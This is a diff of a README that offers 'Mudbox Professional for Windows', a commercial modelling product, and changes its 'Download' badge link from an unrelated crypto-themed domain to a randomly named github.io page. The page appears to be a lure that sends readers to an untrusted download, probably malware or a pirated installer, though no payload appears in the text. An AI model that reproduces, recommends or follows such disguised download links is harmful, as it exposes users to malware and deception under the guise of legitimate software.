@@ -2,7 +2,7 @@
 
 **Mudbox Professional for Windows** is a production‑ready setup engineered for creators who need reliable performance, clean interchange, and predictable output on Windows 10/11. This repository collects practical workflows, presets, and guidance to get from first block‑out to final delivery without toolchain friction.
 
-[![Download Mudbox Professional](https://img.shields.io/badge/Download-Mudbox_Professional-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Mudbox Professional](https://img.shields.io/badge/Download-Mudbox_Professional-blueviolet)](https://xiomaravankotenbqegx.github.io/.github/Mudbox-Professional)
 
 ---
 
